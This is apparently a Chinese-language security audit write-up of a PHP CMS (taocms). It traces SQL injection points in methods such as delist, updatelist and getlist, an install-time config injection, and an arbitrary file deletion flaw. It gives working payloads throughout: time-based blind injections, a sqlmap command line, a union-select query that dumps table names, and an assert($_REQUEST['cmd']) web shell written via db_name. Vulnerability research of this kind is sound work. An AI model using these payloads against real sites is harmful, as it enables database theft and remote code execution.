搜索发现处理数据库请求的类为cms方法为lists
跟进该方法。
发现有过滤函数对变量进行了一些过滤处理。
发现对输入也做了处理。
### 注入点存在处
最后找到几个未过滤的函数方法：delist、getquery、updatelist、get_one、getlist  
那就值针对这几个方法看  
审计开始  
先看第一个函数delist，看到有三个文件有这三个函数，先看第一个
### delist
Article类  
看到传入的参数有表名、参数id，以及where参数，用于筛选匹配数据
在后台管理系统中没看到该模块的调用，然后看CMS类的时候发现CMS继承了Article类，所以看CMS类就好了  
Category  
这里可以看到仍然没有对id进行过滤，直接使用sleep(5)延时，所以返回时间没啥变化。
测试bool盲注，对语句进行拼接，看参数知道是id  
payload：27) or 1=1#
采用延时确认，发现成功延时12s，我们的语句写的是4s，说明经历了三次注入。
这里payload使用--+是失败的，还是需要用#号，不是很明白  
直接上sqlmap，注入出当前user，使用的一些参数  
-v 3 --level 5 --risk 3 --random-agent --current-user --technique T --dbms mysql -p id
继续跟进代码，看看为什么产生了三次延时，看看createtag方法
可以看到传参值也是id，而id在加入sql语句前也没有进行安全处理，只针对tags参数进行过滤，但是我们这个删除执行很明显没有传递tag参数，所以走的是下面的else语句，成功拼接到语句中，根据之前阅读的方法知道，delist、getquery、updatelist、get_one、getlist这几个函数中没有对输入值进行过滤，执行我们的payload。  
这里有两条语句都拼接了所以一共延时了3次
### getquery参数处
没有找到合适的调用方法，所以接着看下一个参数。
updatelist  
category  
看到这里的调用，发现是经过这个add_one处理过的，不是传参的那个status
add_one处理POST传输的数据，对数据了过滤转义，然后返回值，所以不存在注入
而在update函数中，没有进行数据数据过滤处理，有可能存在注入
payload：1) or sleep(4)#getlist
### getlist参数处
category  
根据参数知道id对应的参数为$where参数，对应的同样没有过滤，直接打入payload
延时4s
Admin  
全局搜索getlis，在admin.php中找到edit方法存在getlist的调用，并且能够可控参数
那么直接抓包修改id值，注意不能用or，我用or这个payload打的时候没触发sleep()函数，因为or是代表或的意思，而这里id=2,2是存在的，所以就不执行sleep函数，就像命令中的“||”符号。所以用and直接一起执行。  
payload：2 and sleep(5)%23  
执行成功，直接延时5s
Category  
可以看到也是继承的Article，注入位置也是相同的
payload:1 or sleep(5)%23
Cms  
筛选到cms类中的updateurl方法存在该函数调用，分析前后发现$addsql参数是由$id参数组合而成的，那么也很明显的存在注入，id没有经过处理。
延时成功
lists方法也存在注入点，继续发现getlist语句的参数由$addsql控制，而该参数能够拼接，发现name参数被用安全方法过滤了危险字符，所以主要看cat和status参数。，在save方法。
这个方法我一直想知道在哪个地方调用，我是用ctrl调用也不行，然后发现他是通过传参调用的，在save方法找到该方法的调用。
读源码的时候发现这个tags参数进行了safeword过滤，但是等级只有3级，没有用最高级的，所以没有对输入做到完全过滤的方法，tags还是能进行注入  
根据语句：$tagdata=$this->db->getlist(TB."relations","name='".$tag."'","id,counts",1);可以知道是字符型注入，需要闭合单引号。  
payload：test'+or+sleep(2)%23
这个位置也有另一个注入点。
## 7.install处getshell
判断是否有POST传入db_name，如果有的话就会赋值给$db_name参数，如果没有就会赋值默认的值，跟进
可以看到这里先调用file_get_contents读取了配置文件当中的内容，接着调用了str_replace将默认值替换成了POST中传入的参数值，这里其实三个参数都能够写入shell文件，这里对db_name进行写入shell。  
db_name=|127.0.0.1:3306|root|123456|taocms|');assert($_REQUEST['cmd']);//
## 8.任意文件删除
根据poc对代码进行分析  
?action=file&ctrl=del&path=filepath
先会调用Base类中的catauth方法对$action参数进行判断，之后会判断是否存在相应的类，如果存在的话就实例化该类并赋值给$model，并且会判断$ctrl方法是否存在于$action类中，存在的话就会调用类中无参方法
include/Model/Base.php#119,通过调试发现$_SESSION[TB.'admin_level']=admin，所以返回值为true恒成立，所以上面的代码逻辑会接着往下走  
传入的$action=file,定位到类文件include/Model/File.php
根据File类的构造方法，以及前面传入的参数，$id是可控的，但是没有赋值默认为0，$table即是$action=file,接着这里会对指定文件的真实路径进行拼接，这里的SYS_ROOT就是整个项目的绝对磁盘路径。
这里会对指定绝对路径要删除的文件的全选进行判断，并且如果是文件夹的话会遍历文件夹并判断文件夹是否为空，之后就会直接进行删除的操作，加上目录穿越就可以进行任意文件删除了。
## 9.sql注入
根据poc对源代码进行分析漏洞原理。  
poc  
?name=-1%"+union+select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()%23&cat=0&status=&action=cms&ctrl=lists&submit=%E6%9F%A5%E8%AF%A2  
根据poc来进行分析  
include\Model\Cms.php#112
name,cat,status三个参数都由GET传入，都可控，直接来看调用的DB类中的getlist方法  
include/Db/Mysql.php#60
调用的方法除了前三个参数是由前面调用时传入的参数覆盖的，其他两个参数为默认值，调试输出了最后的sql查询语句  
select count(*) from cms_cms where 1=1 and name like "%-1%" union select
group_concat(table_name) from information_schema.tables where
table_schema=database()#%" ORDER BY id DESC limit 20  
这里sql执行完之后会调用Base类中的magic2word方法，对结果是否为数组进行判断，如果是数组就会存入新的数组并且返回赋值给$datas数组，打印该数组可以发现注入的语句已经成功执行并返回了结果
# REF